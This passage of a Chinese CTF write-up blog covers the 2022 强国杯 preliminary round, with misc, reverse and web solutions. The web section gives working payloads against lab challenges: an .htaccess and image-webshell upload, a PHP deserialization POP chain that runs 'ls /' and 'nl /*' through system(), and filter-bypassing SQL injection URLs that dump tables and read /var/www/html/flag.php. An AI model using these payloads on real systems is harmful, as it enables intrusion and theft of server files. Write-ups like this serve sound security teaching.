class="hljs-string">&quot;&quot;</span>)[$._$_]+$.$_$_+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.$__+$.$$$+<span class="hljs-string">&quot;&#123;\\&quot;</span>+$.__$+$._$_+$.$$$+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.__$+$.__$+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.$_$+$.$_$+$._+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.__$+$._$_+$.$$$_+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.$$_+$.__$+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$._$_+$._$$+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.__$+$.$$_+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$._$_+$.___+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.$_$+$.___+(![]+<span class="hljs-string">&quot;&quot;</span>)[$._$_]+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.___+$.$_$+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.$$$+$.__$+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.$_$+$.__$+$.$$_$+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.__$+$.$__+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.___+$._$_+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.$_$+$.$$_+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.$$$+$.___+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.$$_+$._$$+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$._$_+$.$$_+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.___+$.$$_+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$._$_+$._$_+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$._$$+$.__$+$.__+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.$_$+$._$$+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.$$_+$.$$$+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.__$+$._$$+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$._$$+$.___+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.___+$.$__+$._$+<span class="hljs-string">&quot;&#125;&quot;</span>+<span class="hljs-string">&quot;\&quot;&quot;</span>)())();<br></code></pre></td></tr></table></figure>

<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/qgb-db-misc1-2.png"></p>
<h2 id="PCAP文件分析"><a href="#PCAP文件分析" class="headerlink" title="PCAP文件分析"></a>PCAP文件分析</h2><p><code>flag.pcapng</code>找到没用的<code>flag.zip</code></p>
<p><code>02.pcapng</code>提取出一个<code>02.zip</code>，一个<code>2.png</code></p>
<p><code>2.png</code>上看到压缩包密码<code>Vu8#fI9</code>，解压得到<code>flag2.png</code></p>
<p>修改<code>flag2.png</code>高度得到flag</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/qgb-db-misc2-1.png"></p>
<h2 id="平正开"><a href="#平正开" class="headerlink" title="平正开"></a>平正开</h2><p><em>赛后复现</em></p>
<p>每一位取反后加一</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;aaa&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)<br>d=f.read()<br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.zip&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> d:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">ord</span>(i)==<span class="hljs-number">0</span>:<br>        f.write(<span class="hljs-string">&#x27;\x00&#x27;</span>)<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-built_in">print</span>((<span class="hljs-built_in">ord</span>(i)^<span class="hljs-number">0xff</span>)+<span class="hljs-number">1</span>,<span class="hljs-built_in">ord</span>(i))<br>    f.write(<span class="hljs-built_in">chr</span>((<span class="hljs-built_in">ord</span>(i)^<span class="hljs-number">0xff</span>)+<span class="hljs-number">1</span>))<br>f.close()<br></code></pre></td></tr></table></figure>

<p>伪加密后得到一串<code>社会主义核心价值观加密</code>字符串，解密得到flag</p>
<h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h2 id="re2"><a href="#re2" class="headerlink" title="re2"></a>re2</h2><p>先用<code>pyinstxtractor</code>解包，找到<code>test_obfuscated.pyc</code>，反编译，得到源代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pygame<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> random<br>difficulty = <span class="hljs-number">25</span><br>frame_size_x = <span class="hljs-number">720</span><br>frame_size_y = <span class="hljs-number">480</span><br>check_errors = pygame.init()<br>pygame.display.set_caption(<span class="hljs-string">&#x27;Lets Play&#x27;</span>)<br>game_window = pygame.display.set_mode((frame_size_x, frame_size_y))<br>black = pygame.Color(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)<br>white = pygame.Color(<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>)<br>red = pygame.Color(<span class="hljs-number">255</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)<br>green = pygame.Color(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0</span>)<br>blue = pygame.Color(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">255</span>)<br>fps_controller = pygame.time.Clock()<br>snake_pos = [<br>    <span class="hljs-number">100</span>,<br>    <span class="hljs-number">50</span>]<br>snake_body = [<br>    [<br>        <span class="hljs-number">100</span>,<br>        <span class="hljs-number">50</span>],<br>    [<br>        <span class="hljs-number">90</span>,<br>        <span class="hljs-number">50</span>],<br>    [<br>        <span class="hljs-number">80</span>,<br>        <span class="hljs-number">50</span>]]<br>f_body = [<br>    [<br>        <span class="hljs-number">40</span>,<br>        <span class="hljs-number">29</span>],<br>    [<br>        <span class="hljs-number">40</span>,<br>        <span class="hljs-number">30</span>],<br>    ...<br>    ...<br>    ...<br>    [<br>        <span class="hljs-number">624</span>,<br>        <span class="hljs-number">38</span>]]<br>food_pos = [<br>    random.randrange(<span class="hljs-number">1</span>, frame_size_x // <span class="hljs-number">10</span>) * <span class="hljs-number">10</span>,<br>    random.randrange(<span class="hljs-number">1</span>, frame_size_y // <span class="hljs-number">10</span>) * <span class="hljs-number">10</span>]<br>food_spawn = <span class="hljs-literal">True</span><br>direction = <span class="hljs-string">&#x27;RIGHT&#x27;</span><br>change_to = direction<br>score = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">game_over</span>():<br>    OOOO000000O000OO0 = pygame.font.SysFont(<span class="hljs-string">&#x27;times new roman&#x27;</span>, <span class="hljs-number">90</span>)<br>    O000O0OO0OO0O0O0O = OOOO000000O000OO0.render(<span class="hljs-string">&#x27;YOU DIED&#x27;</span>, <span class="hljs-literal">True</span>, red)<br>    OOO00OO00O0O00O00 = O000O0OO0OO0O0O0O.get_rect()<br>    OOO00OO00O0O00O00.midtop = (frame_size_x / <span class="hljs-number">2</span>, frame_size_y / <span class="hljs-number">4</span>)<br>    game_window.fill(black)<br>    game_window.blit(O000O0OO0OO0O0O0O, OOO00OO00O0O00O00)<br>    show_score(<span class="hljs-number">0</span>, red, <span class="hljs-string">&#x27;times&#x27;</span>, <span class="hljs-number">20</span>)<br>    pygame.display.flip()<br>    time.sleep(<span class="hljs-number">3</span>)<br>    pygame.quit()<br>    sys.exit()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show_score</span>(<span class="hljs-params">OO00000O0O000OO0O, O0O0O0OOOO000O000, O0O0000O00OO00OO0, O0O000OOOOOO00O0O</span>):<br>    O00O000000OO0O0OO = pygame.font.SysFont(O0O0000O00OO00OO0, O0O000OOOOOO00O0O)<br>    O0O0O0O0O0O00O00O = O00O000000OO0O0OO.render(<span class="hljs-string">&#x27;Score : &#x27;</span> + <span class="hljs-built_in">str</span>(score), <span class="hljs-literal">True</span>, O0O0O0OOOO000O000)<br>    O000O0OOOO000OO0O = O0O0O0O0O0O00O00O.get_rect()<br>    <span class="hljs-keyword">if</span> OO00000O0O000OO0O == <span class="hljs-number">1</span>:<br>        O000O0OOOO000OO0O.midtop = (frame_size_x / <span class="hljs-number">10</span>, <span class="hljs-number">15</span>)<br>    <span class="hljs-keyword">else</span>:<br>        O000O0OOOO000OO0O.midtop = (frame_size_x / <span class="hljs-number">2</span>, frame_size_y / <span class="hljs-number">1.25</span>)<br>    game_window.blit(O0O0O0O0O0O00O00O, O000O0OOOO000OO0O)<br><br><span class="hljs-keyword">for</span> event <span class="hljs-keyword">in</span> pygame.event.get():<br>    <span class="hljs-keyword">if</span> event.<span class="hljs-built_in">type</span> == pygame.QUIT:<br>        pygame.quit()<br>        sys.exit()<br>    <span class="hljs-keyword">elif</span> event.<span class="hljs-built_in">type</span> == pygame.KEYDOWN:<br>        <span class="hljs-keyword">if</span> event.key == pygame.K_UP <span class="hljs-keyword">or</span> event.key == <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;w&#x27;</span>):<br>            change_to = <span class="hljs-string">&#x27;UP&#x27;</span><br>        <span class="hljs-keyword">if</span> event.key == pygame.K_DOWN <span class="hljs-keyword">or</span> event.key == <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;s&#x27;</span>):<br>            change_to = <span class="hljs-string">&#x27;DOWN&#x27;</span><br>        <span class="hljs-keyword">if</span> event.key == pygame.K_LEFT <span class="hljs-keyword">or</span> event.key == <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>):<br>            change_to = <span class="hljs-string">&#x27;LEFT&#x27;</span><br>        <span class="hljs-keyword">if</span> event.key == pygame.K_RIGHT <span class="hljs-keyword">or</span> event.key == <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;d&#x27;</span>):<br>            change_to = <span class="hljs-string">&#x27;RIGHT&#x27;</span><br>        <span class="hljs-keyword">if</span> event.key == pygame.K_ESCAPE:<br>            pygame.event.post(pygame.event.Event(pygame.QUIT))<br><span class="hljs-keyword">if</span> change_to == <span class="hljs-string">&#x27;UP&#x27;</span> <span class="hljs-keyword">and</span> direction != <span class="hljs-string">&#x27;DOWN&#x27;</span>:<br>    direction = <span class="hljs-string">&#x27;UP&#x27;</span><br><span class="hljs-keyword">if</span> change_to == <span class="hljs-string">&#x27;DOWN&#x27;</span> <span class="hljs-keyword">and</span> direction != <span class="hljs-string">&#x27;UP&#x27;</span>:<br>    direction = <span class="hljs-string">&#x27;DOWN&#x27;</span><br><span class="hljs-keyword">if</span> change_to == <span class="hljs-string">&#x27;LEFT&#x27;</span> <span class="hljs-keyword">and</span> direction != <span class="hljs-string">&#x27;RIGHT&#x27;</span>:<br>    direction = <span class="hljs-string">&#x27;LEFT&#x27;</span><br><span class="hljs-keyword">if</span> change_to == <span class="hljs-string">&#x27;RIGHT&#x27;</span> <span class="hljs-keyword">and</span> direction != <span class="hljs-string">&#x27;LEFT&#x27;</span>:<br>    direction = <span class="hljs-string">&#x27;RIGHT&#x27;</span><br><span class="hljs-keyword">if</span> direction == <span class="hljs-string">&#x27;UP&#x27;</span>:<br>    snake_pos[<span class="hljs-number">1</span>] -= <span class="hljs-number">10</span><br><span class="hljs-keyword">if</span> direction == <span class="hljs-string">&#x27;DOWN&#x27;</span>:<br>    snake_pos[<span class="hljs-number">1</span>] += <span class="hljs-number">10</span><br><span class="hljs-keyword">if</span> direction == <span class="hljs-string">&#x27;LEFT&#x27;</span>:<br>    snake_pos[<span class="hljs-number">0</span>] -= <span class="hljs-number">10</span><br><span class="hljs-keyword">if</span> direction == <span class="hljs-string">&#x27;RIGHT&#x27;</span>:<br>    snake_pos[<span class="hljs-number">0</span>] += <span class="hljs-number">10</span><br>snake_body.insert(<span class="hljs-number">0</span>, <span class="hljs-built_in">list</span>(snake_pos))<br><span class="hljs-keyword">if</span> snake_pos[<span class="hljs-number">0</span>] == food_pos[<span class="hljs-number">0</span>] <span class="hljs-keyword">and</span> snake_pos[<span class="hljs-number">1</span>] == food_pos[<span class="hljs-number">1</span>]:<br>    score += <span class="hljs-number">1</span><br>    food_spawn = <span class="hljs-literal">False</span><br><span class="hljs-keyword">else</span>:<br>    snake_body.pop()<br><span class="hljs-keyword">if</span> score == <span class="hljs-number">1000</span>:<br>    game_window.fill(black)<br>    <span class="hljs-keyword">for</span> pos <span class="hljs-keyword">in</span> f_body:<br>        pygame.draw.rect(game_window, green, pygame.Rect(pos[<span class="hljs-number">0</span>], pos[<span class="hljs-number">1</span>], <span class="hljs-number">1</span>, <span class="hljs-number">1</span>))<br>    pygame.display.flip()<br>    time.sleep(<span class="hljs-number">10</span>)<br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> food_spawn:<br>    food_pos = [<br>        random.randrange(<span class="hljs-number">1</span>, frame_size_x // <span class="hljs-number">10</span>) * <span class="hljs-number">10</span>,<br>        random.randrange(<span class="hljs-number">1</span>, frame_size_y // <span class="hljs-number">10</span>) * <span class="hljs-number">10</span>]<br>food_spawn = <span class="hljs-literal">True</span><br>game_window.fill(black)<br><span class="hljs-keyword">for</span> pos <span class="hljs-keyword">in</span> snake_body:<br>    pygame.draw.rect(game_window, green, pygame.Rect(pos[<span class="hljs-number">0</span>], pos[<span class="hljs-number">1</span>], <span class="hljs-number">10</span>, <span class="hljs-number">10</span>))<br>pygame.draw.rect(game_window, white, pygame.Rect(food_pos[<span class="hljs-number">0</span>], food_pos[<span class="hljs-number">1</span>], <span class="hljs-number">10</span>, <span class="hljs-number">10</span>))<br><span class="hljs-keyword">if</span> snake_pos[<span class="hljs-number">0</span>] &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> snake_pos[<span class="hljs-number">0</span>] &gt; frame_size_x - <span class="hljs-number">10</span>:<br>    game_over()<br><span class="hljs-keyword">if</span> snake_pos[<span class="hljs-number">1</span>] &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> snake_pos[<span class="hljs-number">1</span>] &gt; frame_size_y - <span class="hljs-number">10</span>:<br>    game_over()<br><span class="hljs-keyword">for</span> block <span class="hljs-keyword">in</span> snake_body[<span class="hljs-number">1</span>:]:<br>    <span class="hljs-keyword">if</span> snake_pos[<span class="hljs-number">0</span>] == block[<span class="hljs-number">0</span>] <span class="hljs-keyword">and</span> snake_pos[<span class="hljs-number">1</span>] == block[<span class="hljs-number">1</span>]:<br>        game_over()<br>show_score(<span class="hljs-number">1</span>, white, <span class="hljs-string">&#x27;consolas&#x27;</span>, <span class="hljs-number">20</span>)<br>pygame.display.update()<br>fps_controller.tick(difficulty)<br><span class="hljs-keyword">continue</span><br></code></pre></td></tr></table></figure>


<p>通过<code>f_body</code>变量中储存的坐标画图得到flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>img=Image.new(<span class="hljs-string">&#x27;1&#x27;</span>,(<span class="hljs-number">1000</span>,<span class="hljs-number">1000</span>))<br>f_body=[...]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> f_body:<br>    img.putpixel(<span class="hljs-built_in">tuple</span>(i),<span class="hljs-number">255</span>)<br>img.show()<br></code></pre></td></tr></table></figure>

<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/qgb-db-re2-1.png"></p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>强国杯</tag>
      </tags>
  </entry>
  <entry>
    <title>2022强国杯技术技能大赛初赛wp</title>
    <url>/%E7%AB%9E%E8%B5%9B/2022%E5%BC%BA%E5%9B%BD%E6%9D%AF%E6%8A%80%E6%9C%AF%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9Bwp.html</url>
    <content><![CDATA[<p>Rank: 10，（东部赛区太卷了吧）</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/qgb.png"></p>
<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="upload-lol"><a href="#upload-lol" class="headerlink" title="upload_lol"></a>upload_lol</h2><p>先传.htaccess，再传图片马，getshell</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/upload_lol-1.png"></p>
<p>有个内容检测，php版本为5，用script标签绕过即可<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/upload_lol-2.png"></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/upload_lol-3.png"></p>
<h2 id="ezpop-new"><a href="#ezpop-new" class="headerlink" title="ezpop_new"></a>ezpop_new</h2><p>源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>) </span>&#123;<br>    <span class="hljs-variable">$safe</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;system&#x27;</span>,<span class="hljs-string">&#x27;fopen&#x27;</span>,<span class="hljs-string">&#x27;fread&#x27;</span>,<span class="hljs-string">&#x27;file_get_contents&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>);<br>    <span class="hljs-variable">$safe</span> = <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$safe</span>) . <span class="hljs-string">&#x27;/i&#x27;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$safe</span>, <span class="hljs-string">&#x27;nonono&#x27;</span>, <span class="hljs-variable">$string</span>);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PingUtils</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$args</span></span>)</span>&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;ping -c4 $&#123;args[0]&#125;&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Cindy</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$someone</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$phone</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">call</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;phone-&gt;<span class="hljs-title function_ invoke__">call</span>(<span class="hljs-variable">$this</span>-&gt;someone);<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Bob</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$flag</span>=True;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;flag)&#123;<br>            <span class="hljs-variable">$cindy</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cindy</span>();<br>            <span class="hljs-variable">$cindy</span>-&gt;someone =  <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;someone&#x27;</span>];<br>            <span class="hljs-variable">$cindy</span>-&gt;phone = <span class="hljs-string">&quot;p50&quot;</span>;<br>            <span class="hljs-comment">#var_dump(filter(serialize($cindy)));</span><br>            <span class="hljs-variable">$cindy</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$cindy</span>)));<br>            <span class="hljs-variable">$cindy</span>-&gt;<span class="hljs-title function_ invoke__">call</span>(<span class="hljs-variable">$someone</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;nonono&#x27;</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;flag = False;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Alice</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;c-&gt;b;<br>    &#125;<br>&#125;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>@<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]);<br></code></pre></td></tr></table></figure>

<p>从入口先到<code>__destruct()</code>，往下走只能是echo触发<code>__toString</code>或者<code>$this-&gt;c-&gt;b</code>，对于<code>$this-&gt;c</code>触发<code>__get</code>，这里显然只有<code>__get</code>能用</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/ezpop_new-1.png"></p>
<p>但是进入<code>__get</code>中利用的部分需要条件<code>if($this-&gt;flag)</code>，显然</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;flag = False;<br>    &#125;<br></code></pre></td></tr></table></figure>
<p>会阻碍这个条件成立</p>
<p>由于题目中的PHP版本合适,可以采用修改超过成员数目来绕过<code>wakeup</code></p>
<p>payload:<code>?pop=O:5:&quot;Alice&quot;:1:&#123;s:1:&quot;c&quot;;O:3:&quot;Bob&quot;:2:&#123;s:4:&quot;flag&quot;;b:1;&#125;&#125;</code></p>
<p>进入下一个利用部分，考察反序列化字符串替换溢出</p>
<p>利用点在</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PingUtils</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$args</span></span>)</span>&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;ping -c4 $&#123;args[0]&#125;&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>而此又需要从</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Cindy</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$someone</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$phone</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">call</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;phone-&gt;<span class="hljs-title function_ invoke__">call</span>(<span class="hljs-variable">$this</span>-&gt;someone);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>触发</p>
<p>但是此处的赋值是无法实现这个功能的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$cindy</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cindy</span>();<br><span class="hljs-variable">$cindy</span>-&gt;someone =  <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;someone&#x27;</span>];<br><span class="hljs-variable">$cindy</span>-&gt;phone = <span class="hljs-string">&quot;p50&quot;</span>;<br></code></pre></td></tr></table></figure>


<p>利用点在</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$cindy</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$cindy</span>)));<br></code></pre></td></tr></table></figure>
<p>其中的filter会对反序列化后的字符串进行特定值替换,然后再解压</p>
<div class="note note-info">
            <p>所以可以通过赋值特定字符串触发filter中的过滤实现溢出,从而达到后面自PingUtils类到filter这条链的利用</p><p>因为序列化后的字符串中是依靠特定位置的数字来标示其后的属性内容的长度,这个非等长替换就会导致在反序列化解析时出现整体的偏移,原本的作为结构的部分被偏移到属性内容的部分,属性内容的部分值又会偏移视为结构的部分</p><p>构造足够多的非等长替换,就能偏移出一个完整结构部分,在里面定义出需要的属性</p><p>一个序列化后的字符串如果存在多余无法正常解析的部分,这部分前面如果能被正常解析,那么多余部分在解析时会被抛弃掉，所以构造产生多余数据不用担心，会被忽略掉</p>
          </div>



<p>构造出payload:<br><code>someone=freadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfread|ls  /&quot;;s:5:&quot;phone&quot;;O:9:&quot;PingUtils&quot;:0:&#123;&#125;&#125;</code></p>
<div class="note note-info">
            <p>对于payload来说，在<code>filter</code>替换前<code>$cindy-&gt;someone</code>属性的值序列化字符串表示是 <code>s:5:&quot;cindy&quot;;s:224:&quot;PAYLOADSTRING....&quot;</code>这样</p><p>但是<code>filter</code>替换会把<code>fread</code>换成<code>nonono</code>即长度<code>5</code>的字符串变成长度<code>6</code></p><p>但此时<code>$cindy-&gt;someone</code>属性用来表示其值 这一字符串的长度的数字还是<code>224</code>没变</p><p>但实际上替换后值字符串的总长度由<code>224</code>变成了<code>224+35</code>(有35个fread替换为了nonono)</p><p>所以反序列化只会取值字符串前<code>224</code>个字符作为<code>$cindy-&gt;someone</code>属性反序列化后的值</p><p>剩下<code>35</code>则会被当成反序列化字符串中的结构部分杯解析</p><p>即在PHP看来整个字符串是这样的<code>&quot;cindy&quot;;s:224:&quot;AfterPayloadString...&quot;;s:5:&quot;phone&quot;;O:9:&quot;PingUtils&quot;:0:{}}</code></p><p>在<code>cindy</code>属性后面还有一个属性<code>phone</code>,其值是个名为<code>PingUtils</code>的对象</p><p>注意最末尾的<code>}</code>.这个将于整个反序列化字符串开始的<code>{</code>闭合,PHP将把这个看作反序列化字符串的结尾</p><p>只有后面的内容由于结构不完整PHP并不会解析,而是直接抛弃并且不会产生任何报错</p>
          </div>


<p>读取flag：<br><code>?pop=O:5:&quot;Alice&quot;:1:&#123;s:1:&quot;c&quot;;O:3:&quot;Bob&quot;:2:&#123;s:4:&quot;flag&quot;;b:1;&#125;&#125;&amp;someone=freadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfread|nl /*&quot;;s:5:&quot;phone&quot;;O:9:&quot;PingUtils&quot;:0:&#123;&#125;&#125;</code></p>
<h2 id="file-sql-new"><a href="#file-sql-new" class="headerlink" title="file_sql_new"></a>file_sql_new</h2><p><em>赛后复现</em></p>
<p>sql注入，过滤了一次select</p>
<p>双写select绕过</p>
<p>payload：</p>
<p><code>http://39.107.71.45:65441/index.php?id=-1%27union%20seleselectct%201,(seselectlect(group_concat(table_name))from(information_schema.tables)where((table_schema)=(database()))),3%23</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/file_sql_new-1.png"></p>
<p><code>http://39.107.71.45:65441/index.php?id=-1%27union%20seleselectct%201,(selselectect(group_concat(column_name))from(information_schema.columns)where((table_name)=(%27fl4g%27))),3%23</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/file_sql_new-2.png"></p>
<p><code>http://39.107.71.45:65441/index.php?id=-1%27union%20seleselectct%201,(seselectlect(fllllag)from(fl4g)),3%23</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/file_sql_new-3.png"></p>
<p><code>http://39.107.71.45:65441/index.php?id=-1%27union%20seleselectct%201,(seleselectct(hex(load_file(%22/var/www/html/flag.php%22)))),3%23</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/file_sql_new-4.png"></p>
<p>得到<code>3C3F7068700A0A24666C6167203D207B6C69726768793864757370717A6A6631623735636E6561773330343974766D787D3B0A6563686F20226161223B0A3F3E0A</code>，转字符串即可得到flag</p>
<h2 id="ezweb-new"><a href="#ezweb-new" class="headerlink" title="ezweb_new"></a>ezweb_new</h2><p><em>赛后复现</em></p>
